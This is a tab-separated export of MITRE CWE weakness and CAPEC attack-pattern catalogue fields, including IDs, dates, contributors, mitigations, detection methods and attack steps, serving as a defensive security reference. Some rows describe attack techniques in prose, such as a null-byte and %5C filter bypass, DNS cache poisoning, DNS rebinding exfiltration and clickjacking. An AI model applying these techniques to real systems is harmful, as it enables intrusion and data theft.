11176	28	Eric Dalci
17875	35	MITRE
11317	75	Detection techniques for buffer-related errors are more mature than for most other weakness types.
24038	31	1000
22109	28	CWE Content Team
13801	51	2014-06-23
8566	104	466
18093	28	CWE Content Team
15384	100	The MITRE Corporation
12140	35	MITRE
11586	62	updated Common_Consequences
19016	70	Testing Flash Applications
10961	62	updated Related_Attack_Patterns
12717	24	MITRE
6781	62	updated Relationships
10556	61	Draft
8371	35	Cigital
11668	39	2011-06-27
21414	39	2008-07-01
17383	54	Low
6900	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
7995	23	The document does not fully define all mechanisms that are used      to control or influence how product-specific programs are      executed.
11552	23	This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.
18681	62	updated Related_Attack_Patterns
9791	62	updated Relationships
6065	74	2
17876	39	2010-12-13
10120	35	MITRE
21162	28	CWE Content Team
19464	85	121
5980	35	MITRE
8739	97	Leveraging Active Man in the Middle Attacks to Bypass Same Origin Policy
22889	28	Eric Dalci
12406	59	Updated Related_Weaknesses
22246	102	CanFollow
12360	23	The software does not handle or incorrectly handles when a particular structural element is not completely specified.
9815	36	http://www.ivizsecurity.com/blog/web-application-security/testing-flash-applications-pen-tester-guide/
10032	35	MITRE
25387	97	XSS Through HTTP Headers
6665	26	Implementation
16967	49	1975
16341	28	CWE Content Team
23550	92	Explore
11931	36	http://scarybeastsecurity.blogspot.com/2009/12/cross-domain-search-timing.html
17575	39	2010-06-21
15337	62	updated Relationships
10250	103	Primary
24994	76	2017-05-01
10074	79	Authorization
15144	59	Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
16977	63	DoS: Crash, Exit, or Restart
13042	62	updated Time_of_Introduction
22695	61	Draft
24154	62	updated Demonstrative_Examples, Relationships
24013	91	Architecture and Design
11629	28	CWE Content Team
9486	79	Confidentiality
17321	23	An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.
19764	66	Prevent race conditions
18268	62	updated Relationships, Observed_Example, Taxonomy_Mappings
20149	62	updated Potential_Mitigations
17547	62	updated Demonstrative_Examples, Relationships
19205	25	Low
14255	31	1000
25119	39	2008-09-08
15560	39	2011-06-01
22881	28	CWE Content Team
21663	103	Primary
12129	28	CWE Content Team
7051	77	Automated Static Analysis - Source Code
6653	62	updated Common_Consequences
13631	39	2012-05-11
16086	100	The MITRE Corporation
8557	35	MITRE
24584	56	CanPrecede
20136	47	Bypass Protection Mechanism
20469	39	2009-10-29
24359	35	MITRE
6355	35	MITRE
22913	56	ChildOf
11355	101	CAPEC Content Team
7792	62	updated Applicable_Platforms, References, Relationships
10641	35	MITRE
23657	42	Explicitly define a final object() to prevent deserialization.
19295	35	MITRE
10577	86	http://www.cs.ucdavis.edu/research/tech-reports/2010/CSE-2010-2.pdf
22023	28	CWE Content Team
12309	28	CWE Content Team
12539	61	Draft
8406	78	High
21462	59	Updated Description, Description Summary, Examples-Instances, Related_Attack_Patterns, Type (Attack_Pattern -> Relationship)
22336	35	MITRE
12473	62	updated Common_Consequences
18227	79	Access Control
15664	86	http://www.ftc.gov/privacy/glbact/index.html
6600	43	Simple
7428	101	CAPEC Content Team
19898	33	Beth Stearns
11308	72	When a resource is released it might not be in an expected state, later attempts to access the resource may lead to resultant errors that may lead to a crash.
24021	35	MITRE
15374	31	1000
15136	63	Read Application Data
6545	28	CWE Content Team
7458	39	2015-12-07
14858	35	MITRE
8278	25	Medium
16996	80	An attacker can simply overflow an integer by inserting an out of range value.
6431	28	CWE Content Team
11163	62	updated Relationships, Taxonomy_Mappings
13686	62	updated Potential_Mitigations
11420	63	Modify Files or Directories
17695	35	MITRE
7951	21	PLOVER
25098	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10371	35	MITRE
23152	28	CWE Content Team
10542	81	Availability
13133	27	In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications.
12107	56	ChildOf
15648	28	CWE Content Team
22375	35	MITRE
19392	53	The MITRE Corporation
15705	62	updated Common_Consequences
10749	81	Integrity
10287	21	CLASP
15766	48	11
10576	28	CWE Content Team
15586	73	Watch temporary directories to see when temporary files are created, modified and deleted.
8444	62	updated Common_Consequences, Relationships, Theoretical_Notes
12940	53	The MITRE Corporation
21434	39	2017-11-08
21625	101	CAPEC Content Team
24553	63	Read Files or Directories
7180	28	CWE Content Team
19539	39	2010-06-21
25348	28	Eric Dalci
22596	35	Cigital
7427	72	Bypassing the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is an important component of vulnerabilities like cross-site scripting, process control, and SQL injection.
8963	35	MITRE
12780	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
20882	69	Incomplete
8780	76	2015-11-09
16635	35	MITRE
7879	62	updated Common_Consequences
8546	45	Base
12967	101	CAPEC Content Team
19153	28	CWE Content Team
6164	24	MITRE
18119	35	MITRE
14440	81	Other
6503	35	MITRE
7315	39	2019-06-20
19206	62	updated Taxonomy_Mappings
21160	45	Base
16146	66	SSRF vs. Business-critical Applications. Part 1: XXE Tunnelling in SAP NetWeaver
10191	31	699
5712	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.
6702	62	updated Potential_Mitigations
6716	35	MITRE
14821	62	updated Potential_Mitigations
10221	62	updated Relationships
18522	97	Clickjacking
6731	35	MITRE
16975	26	Architecture and Design
12304	95	[Footprint file input vectors] Manually or using an automated tool, an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.
23428	28	CWE Content Team
11533	35	MITRE
5745	21	Anonymous Tool Vendor (under NDA)
6978	39	2014-07-30
20134	28	CWE Content Team
17945	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
14418	92	Experiment
22641	91	Implementation
24575	62	updated Potential_Mitigations
11636	52	Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.                   Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.
12578	28	CWE Content Team
20720	62	updated Other_Notes, Relationship_Notes
17562	27	None: No specialized resources are required to execute this type of attack.
17841	104	244
14211	35	MITRE
12815	21	CWE Content Team
21570	28	CWE Content Team
22412	55	CAPEC Content Team
6162	39	2009-05-27
11226	62	updated Description, Name
17045	62	updated Common_Consequences
8467	42	Choose a language or tool that provides automatic memory management, or makes manual memory management less error-prone.                   For example, glibc in Linux provides protection against free of invalid pointers.                   When using Xcode to target OS X or iOS, enable automatic reference counting (ARC) [REF-391].                   To help correctly and consistently manage memory when programming in C++, consider using a smart pointer class such as std::auto_ptr (defined by ISO/IEC ISO/IEC 14882:2003), std::shared_ptr and std::unique_ptr (specified by an upcoming revision of the C++ standard, informally referred to as C++ 1x), or equivalent solutions such as Boost.
12384	88	Missing Critical Step in Authentication
6409	81	Other
20491	35	MITRE
15837	31	1000
14166	28	CWE Content Team
22831	101	CAPEC Content Team
22276	63	Read Memory
7767	35	MITRE
14083	62	updated Relationships
9934	89	Standard
23148	28	CWE Content Team
11722	96	2009-03-03
12046	56	ChildOf
17771	89	Detailed
14339	76	2019-04-04
11603	40	Access to the hardware currently deployed at a victim location.
15502	42	Do not extensively rely on catching exceptions (especially for validating user input) to handle errors. Handling exceptions can decrease the performance of an application.
20512	76	2018-07-31
13217	35	MITRE
17829	55	CAPEC Content Team
9499	35	MITRE
21411	62	updated Relationships, Taxonomy_Mappings
14065	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
6301	35	MITRE
20177	89	Detailed
8200	91	Architecture and Design
5860	39	2011-06-01
17412	96	2008-01-30
20623	102	CanPrecede
18105	21	CWE Content Team
5740	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
21198	28	CWE Content Team
17444	47	Other
25368	74	2
20630	53	The MITRE Corporation
13350	28	CWE Content Team
20042	70	IDS Evasion with Unicode
18422	90	Language-Independent
24772	63	Gain Privileges or Assume Identity
24399	40	The target must associate data or activities with a person's identity and the adversary must be able to modify this identity without detection.
21761	103	Primary
21819	77	Architecture or Design Review
23091	57	Primary
7453	55	CAPEC Content Team
25340	39	2013-07-17
5827	28	CWE Content Team
7813	31	1000
11520	35	MITRE
21839	35	MITRE
19956	81	Availability
16131	35	MITRE
14451	28	CWE Content Team
8031	81	Confidentiality
18201	35	MITRE
8802	45	Base
19722	39	2009-03-10
17298	95	[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.
9339	35	MITRE
15264	39	2008-07-01
6966	79	Availability
20159	28	CWE Content Team
10344	74	3
15484	102	ChildOf
14050	35	MITRE
23743	56	ChildOf
8227	39	2008-09-08
6721	28	CWE Content Team
11258	74	3
16942	31	699
9898	35	MITRE
20907	45	Base
18396	44	High
6717	35	MITRE
23732	103	Primary
9239	95	The attacker then injects a string of their choosing with a null terminator (using an alternate encoding such as %00), followed by a backslash (%5C), followed by some additional characters that are required to keep the filter happy
10778	39	2012-05-11
24082	35	MITRE
19379	35	MITRE
23020	31	1000
24355	28	CWE Content Team
13459	62	updated Potential_Mitigations
25180	76	2018-07-31
18218	88	Multiple Locks of a Critical Resource
17896	39	2008-09-08
17803	61	Draft
8391	28	CWE Content Team
23265	39	2019-01-03
8986	35	MITRE
19931	21	CWE Content Team
22346	39	2011-09-13
22293	39	2008-09-08
12872	81	Availability
16401	90	Language-Independent
20655	62	updated Taxonomy_Mappings
13693	39	2011-06-01
11579	85	597
6237	102	CanPrecede
9754	47	Gain Privileges
10715	78	High
18661	62	updated Potential_Mitigations, References, Relationships
12703	23	An attacker carefully crafts small snippets of Java Script to efficiently detect the type of browser the potential victim is using. Many web-based attacks need prior knowledge of the web browser including the version of browser to ensure successful exploitation of a vulnerability. Having this knowledge allows an attacker to target the victim with attacks that specifically exploit known or zero day weaknesses in the type and version of the browser used by the victim. Automating this process via Java Script as a part of the same delivery system used to exploit the browser is considered more efficient as the attacker can supply a browser fingerprinting method and integrate it with exploit code, all contained in Java Script and in response to the same web page request by the browser.
22161	40	An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.
18955	43	Simple
13507	78	Low
10341	39	2008-09-08
13851	73	Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.
6606	100	The MITRE Corporation
16053	43	Simple
10069	40	The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.
14516	56	ChildOf
14926	35	MITRE
8990	62	updated Demonstrative_Examples
11211	42	Use class accessor and mutator methods appropriately. Perform validation when accepting data from a public method that is intended to modify a critical private variable. Also be sure that appropriate access controls are being applied when a public method interfaces with critical data.
9862	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.
20076	35	MITRE
24837	39	2017-11-08
23013	28	CWE Content Team
23976	28	CWE Content Team
6517	39	2011-06-27
20416	35	MITRE
7820	88	Object Model Violation: Just One of Equals and Hashcode Defined
17333	35	MITRE
7800	101	CAPEC Content Team
24154	28	CWE Content Team
13318	59	Updated Description Summary, Examples-Instances, References
23084	28	CWE Content Team
7295	46	Such hooks can be used in defensive software that runs with privileges, such as anti-virus or firewall, which hooks kernel calls. When the arguments are not validated, they could be used to bypass the protection scheme or attack the product itself.
7342	81	Integrity
25100	42	Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all required steps.
23150	42	Perform output validation in order to filter/escape/encode unsafe data that is being passed from the server in an HTTP response header.
25012	97	TCP Congestion Control Flag (ECN) Probe
12149	91	Architecture and Design
14477	39	2014-07-30
24036	97	Add Malicious File to Shared Webroot
19564	39	2014-02-18
25012	23	This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.
21212	35	MITRE
12184	50	Design: Browser's design needs to be changed to limit where cookies can be stored on the client side and provide an option to clear these cookies in all places, as well as another option to stop these cookies from being written in the first place.                Design: Safari browser's private browsing mode is currently effective against evercookies.
21609	28	CWE Content Team
8606	62	updated Demonstrative_Examples
11193	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
7348	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
7302	62	updated Potential_Mitigations, Relationships, Taxonomy_Mappings
15177	35	MITRE
11554	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
17805	35	MITRE
17590	39	2014-06-23
20722	39	2009-05-27
22808	39	2018-01-23
22521	39	2011-06-01
15067	77	Automated Analysis
7064	35	MITRE
21563	102	ChildOf
20021	47	Read Data
5969	39	2008-09-08
9818	101	CAPEC Content Team
7736	39	2009-07-27
13396	39	2010-06-21
22019	35	MITRE
14417	81	Non-Repudiation
18514	39	2008-10-14
19784	85	506
10288	26	Implementation
20187	81	Availability
23257	103	Primary
12913	59	Updated Related_Attack_Patterns
24176	47	Other
10248	35	MITRE
18720	63	Bypass Protection Mechanism
10514	28	CWE Content Team
23711	62	updated Potential_Mitigations
10715	50	Enforce regular patching of software.
17114	89	Detailed
10879	42	When using multithreading and operating on shared variables, only use thread-safe functions.
21335	28	CWE Content Team
8190	28	CWE Content Team
19916	26	Implementation
22040	89	Standard
9811	28	CWE Content Team
10131	39	2010-06-21
9142	81	Confidentiality
17851	104	1107
16516	62	updated Description, Name
11175	39	2009-07-27
23162	67	High
17358	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
7296	39	2008-08-01
24190	35	MITRE
14379	45	Base
7347	91	Implementation
13471	39	2014-07-30
6161	62	updated Potential_Mitigations, Time_of_Introduction
22344	86	http://msdn.microsoft.com/en-us/library/cc264614.aspx
24023	95	[Craft an iFrame Overlay page] The attacker crafts a malicious iFrame overlay page.
10487	62	updated Description, Other_Notes, Potential_Mitigations
9528	39	2008-11-24
22448	28	CWE Content Team
24877	30	Stewart A.
8104	28	CWE Content Team
12811	61	Draft
20306	62	updated Applicable_Platforms, Relationships
19973	28	CWE Content Team
21614	35	MITRE
18544	39	2014-07-30
20814	85	637
5930	59	Updated Attack_Phases
22293	28	CWE Content Team
23801	21	CWE Content Team
11414	81	Integrity
16631	39	2011-09-13
15006	62	updated Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships
21480	62	updated Applicable_Platforms
6778	95	[Attempt sending crafted records to DNS cache] A request is sent to the authoritative server for target website and wait for the iterative name resolver. An adversary sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.
5901	47	Execute Unauthorized Commands
24435	23	A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An adversary modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the adversary specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Adversaries can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.
6510	33	CERT
12259	23	An adversary uses a social engineering technique to convey a sense of authority that motivates the target to reveal specific information or take specific action. There are various techniques for producing a sense of authority during ordinary modes of communication. One common method is impersonation. By impersonating someone with a position of power within an organization, an adversary may motivate the target individual to reveal some piece of sensitive information or perform an action that benefits the adversary.
13354	39	2011-06-01
15595	43	Simple
12838	21	CWE Content Team
19106	59	Updated References
22142	23	In this attack scenario, the attacker uses knowledge of the target’s mobile phone number (i.e., the number associated with the SIM used in the retransmission device) to cause the cellular network to send broadcast messages to alert the mobile device. Since the network knows which cell tower the target’s mobile device is attached to, the broadcast messages are only sent in the Location Area Code (LAC) where the target is currently located. By triggering the cellular broadcast message and then listening for the presence or absence of that message, an attacker could verify that the target is in (or not in) a given location.
14235	35	MITRE
22175	52	Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption.
6592	95	[Determine exploitability of DNS rebinding access to target address] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses.
23413	39	2010-06-21
18257	77	Automated Static Analysis
19413	56	ChildOf
10454	91	Policy
7229	35	MITRE
12330	81	Non-Repudiation
10306	31	1000
23667	26	Implementation
10994	35	MITRE
19978	104	358
17636	39	2008-07-01
24307	35	MITRE
10552	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.
10539	23	The code contains callable control elements that          contain an excessively large number of references to other          application objects external to the context of the callable,          i.e. a Fan-Out value that is excessively large.
14977	91	Architecture and Design
24379	26	Implementation
12076	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.
6603	28	CWE Content Team
16208	100	The MITRE Corporation
18159	39	2009-12-28
19471	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
20862	35	MITRE
7534	35	MITRE
9605	62	updated Relationships, Taxonomy_Mappings
14855	42	Use an abstraction library to abstract away risky APIs. Examples include the Safe C String Library (SafeStr) by Viega, and the Strsafe.h library from Microsoft. This is not a complete solution, since many buffer overflows are not related to strings.
21789	35	MITRE
15326	28	CWE Content Team
24579	62	updated Modes_of_Introduction, Relationships
23920	21	CWE Content Team
5890	100	The MITRE Corporation
12740	28	CWE Content Team
24075	42	Proper error checking can reduce the risk of inadvertently introducing sentinel values into data. For example, if a parsing function fails or encounters an error, it might return a value that is the same as the sentinel.
19550	35	MITRE
22467	62	updated Common_Consequences
24753	76	2019-09-30
16607	72	Should the null character corrupt the process flow, or affect a flag controlling access, it may lead to logical errors which allow for the execution of arbitrary code.
24996	39	2008-07-01
15715	86	http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm
20499	31	1000
19041	50	Ensure all content that is delivered to client is sanitized against an acceptable content specification.
20772	103	Primary
16597	30	Denis Foo Kune
22080	35	MITRE
15913	72	The resource in question, or other resources (through the corrupted one) may be changed in undesirable ways by a malicious user.
21192	35	MITRE
6872	69	Draft
11742	35	MITRE
11532	28	CWE Content Team
24496	62	updated Applicable_Platforms
18891	62	updated Name
14511	35	MITRE
25411	74	4
13237	39	2012-05-11
7846	78	Low
8397	40	The adversary requires a brute force tool.
6975	70	Inappropriate Use of Adobe Code Signing Certificate
14062	49	2006
18095	100	The MITRE Corporation
19537	101	CAPEC Content Team
6329	72	When allocating resources without limits, an attacker could prevent other systems, applications, or processes from accessing the same type of resource.
22041	28	CWE Content Team
18252	91	Implementation
17804	62	updated Related_Attack_Patterns
10367	39	2009-07-27
23616	35	MITRE
15647	94	Run Arbitrary Code
8466	62	updated Name, Relationships, Type
16597	30	Yongdae Kim
25272	42	Appropriately filter or quote CRLF sequences in user-controlled input.
22151	23	The software invokes a function for normalizing paths or file names, but it provides an output buffer that is smaller than the maximum possible size, such as PATH_MAX.
11594	97	Padding Oracle Crypto Attack
12833	28	CWE Content Team
23854	62	updated Potential_Mitigations, Time_of_Introduction
19645	35	MITRE
13346	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10686	103	Primary
14839	39	2009-07-27
6022	59	Updated References
7328	39	2011-06-01
18953	39	2010-12-13
8251	100	The MITRE Corporation
5658	28	CWE Content Team
11054	28	CWE Content Team
12143	62	updated Relationships, Taxonomy_Mappings
10294	35	MITRE
8445	94	Run Arbitrary Code
13872	39	2010-06-21
10962	39	2011-06-01
6853	45	Base
22614	42	Whenever possible, specify implementation strategies that do not introduce time variances in operations.
14671	28	CWE Content Team
17311	81	Integrity
24719	28	CWE Content Team
21525	53	The MITRE Corporation
6280	100	The MITRE Corporation
17632	63	DoS: Crash, Exit, or Restart
14292	76	2018-07-31
19195	76	2019-09-30
6859	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
8771	35	Cigital
19381	103	Primary
20526	47	Read Data
22609	101	CAPEC Content Team
12611	28	CWE Content Team
7046	26	Architecture and Design
9926	100	The MITRE Corporation
10945	81	Availability
9275	35	MITRE
20982	35	MITRE
15761	79	Authorization
22042	56	PeerOf
15197	103	Primary
10588	102	ChildOf
10163	28	CWE Content Team
14990	88	Use of Inner Class Containing Sensitive Data
7003	91	Implementation
8762	55	CAPEC Content Team
22956	28	CWE Content Team
22393	104	758
18817	35	MITRE
15126	59	Updated Related_Attack_Patterns
8587	28	CWE Content Team
14389	33	Blake Watts
5865	50	Implementation: use crossdomain.xml file to allow the application domain to load stuff or the SWF file called by other domain.
19024	91	Implementation
9821	86	http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt
17457	23	The software does not properly acquire or release a lock on a resource, leading to unexpected resource state changes and behaviors.
11688	61	Draft
8650	72	If the function is used incorrectly, then it could result in security problems.
17060	100	The MITRE Corporation
11534	39	2019-01-03
22530	59	Updated References, Solutions_and_Mitigations
18397	89	Detailed
10828	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
19041	50	Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode
12155	62	updated Demonstrative_Examples
14041	81	Other
19081	86	http://www.cprogramming.com/tutorial/exceptions.html
21012	43	Simple
24962	100	The MITRE Corporation
19512	56	ChildOf
22256	78	High
11401	35	MITRE
22057	50	Implementation: Perform input validation for all remote content, including remote and user-generated content.
10164	28	CWE Content Team
24433	91	Implementation
11660	45	Base
18055	35	MITRE
24080	62	updated Relationships, Taxonomy_Mappings
6003	35	MITRE
18557	39	2008-10-14
8908	49	2005
9710	47	Other
17837	62	updated Description, Other_Notes
14994	62	updated Demonstrative_Examples, Observed_Examples, Relationships
17649	28	CWE Content Team
12544	35	MITRE
10256	28	CWE Content Team
24910	35	MITRE
16920	103	Primary
16431	90	Language-Independent
6444	39	2009-10-29
22364	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
7915	62	updated Maintenance_Notes
9554	35	MITRE
25260	26	Architecture and Design
8908	33	Sean Barnum
23168	45	Variant
9508	69	Draft
16738	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, References, Relationships
18443	35	MITRE
21957	39	2017-11-08
19595	26	Implementation
20089	45	Class
17266	48	10
17545	100	The MITRE Corporation
12706	103	Primary
8559	28	CWE Content Team
24879	78	High
15713	35	MITRE
25330	39	2012-10-30
5687	96	2009-03-03
16895	25	High
24001	39	2008-11-24
24066	90	Java
18194	69	Draft
8360	101	CAPEC Content Team
15312	51	2014-06-23
21551	45	Class
24906	81	Other
21728	59	Updated Related_Attack_Patterns
18780	35	MITRE
6789	63	Quality Degradation
16443	91	Implementation
12980	35	MITRE
24447	46	The use of inconsistent implementations can cause changes in behavior when the code is ported or built under a different environment than the programmer expects, which can lead to security problems in some cases.             The implementation of many functions varies by platform, and at times, even by different versions of the same platform. Implementation differences can include:                                                Slight differences in the way parameters are interpreted leading to inconsistent results.                   Some implementations of the function carry significant security risks.                   The function might not be defined on all platforms.                   The function might change which return codes it can provide, or change the meaning of its return codes.
23881	67	Medium
14479	95	On the probing stage, the attacker injects malicious code using the API call and observes the results. The attacker's goal is to uncover a buffer overflow vulnerability.
24788	62	updated Common_Consequences
7674	35	MITRE
15854	28	CWE Content Team
17028	35	MITRE
7555	35	MITRE
12288	78	High
16001	62	updated Relationships
13744	73	Spider web sites for all available links, entry points to the web site.
9810	63	Modify Files or Directories
9209	88	Dangerous Signal Handler not Disabled During Sensitive Operations
19396	59	Updated Related_Attack_Patterns
20955	56	ChildOf
13436	28	CWE Content Team
13544	80	Once this attack pattern is developed and understood, creating an exploit is not very complex.The attacker needs to have knowledge of the URLs that need to be accessed on the target system to request the JSON objects.
22140	50	Use a language or compiler that performs automatic bounds checking.
20570	28	Eric Dalci
19182	85	478
11032	39	2008-09-08
15729	63	Execute Unauthorized Code or Commands
6393	62	updated References
17115	28	CWE Content Team
19080	35	MITRE
11927	35	MITRE
6912	85	475
14695	90	C++
16229	81	Integrity
9437	56	ChildOf
18195	39	2012-05-11
6206	39	2008-09-08
11093	35	MITRE
16884	62	updated Relationships, Other_Notes
11107	39	2014-07-30
7295	90	Language-Independent
17482	49	2012
6252	81	Integrity
21335	62	updated Potential_Mitigations
12963	46	ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.
24358	42	Implement a reliable lock mechanism.
23493	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
23071	42	When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
13923	32	Mandiant
19769	35	MITRE
12377	39	2012-05-11
13110	56	ChildOf
10170	79	Availability
16663	28	CWE Content Team
8697	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
11632	39	2008-07-01
18592	59	Updated Related_Weaknesses
19042	100	The MITRE Corporation
24538	50	Implementation: Upgrade phone lines. Note this may be prohibitively expensive
12502	39	2008-07-01
11915	35	MITRE
7123	25	High
14315	21	Anonymous Tool Vendor (under NDA)
10801	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
16644	39	2008-11-24
13513	90	PHP
23754	28	CWE Content Team
19701	62	updated References, Relationships
12996	56	CanPrecede
13660	79	Availability
18745	62	updated Relationships
11190	56	ChildOf
8860	51	2014-06-23
21425	102	CanPrecede
22357	79	Authorization
8421	21	CWE Content Team
5703	97	Identify Shared Files/Directories on System
24020	26	Architecture and Design
13586	39	2008-07-01
13897	62	updated Relationships
7017	46	Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the software administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:                             Inbound: the software contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.                Outbound: the software connects to another system or component, and it contains hard-coded credentials for connecting to that component.                          In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.             The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.
7243	39	2011-06-27
18598	103	Primary
23506	33	Herbert Schildt
16623	73	Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).
14519	73	The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).
9016	39	2012-10-30
12654	92	Experiment
20821	47	Gain Privileges
